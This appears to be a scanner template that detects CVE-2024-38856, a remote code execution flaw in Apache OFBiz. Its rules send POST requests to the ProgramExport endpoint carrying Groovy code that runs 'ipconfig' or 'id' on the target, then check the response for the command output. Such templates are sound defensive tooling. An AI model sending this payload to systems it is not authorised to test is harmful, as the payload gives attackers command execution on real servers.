id: CVE-2024-38856
info:
  name: Apache OFBiz CVE-2024-38856 远程命令执行漏洞
  author: avic123
  severity: critical
  verified: true
  description: |
    Apache OFBiz是一个电子商务平台，用于构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类应用系统。
    2024年8月，官方发布新版本修复了CVE-2024-38856 Apache OFBiz 代码执行漏洞，攻击者可构造恶意请求控制服务器。建议尽快修复漏洞。
  reference:
    - https://issues.apache.org/jira/browse/OFBIZ-13128
    - https://cwiki.apache.org/confluence/display/WW/S2-013https://lists.apache.org/thread/olxxjk6b13sl3wh9cmp0k2dscvp24l7w
  tags: cve,cve2024,ofbiz,rce
  created: 2024/08/08

rules:
  r0:
    request:
      method: POST
      path: /webtools/control/main/ProgramExport
      body: groovyProgram=throw new Exception('ipconfig'.execute().text);
    expression: response.status == 200 && response.body.bcontains(b'Windows IP')
  r1:
    request:
      method: POST
      path: /webtools/control/main/ProgramExport
      body: groovyProgram=throw new Exception('id'.execute().text);
    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.raw)
expression: r0() || r1()
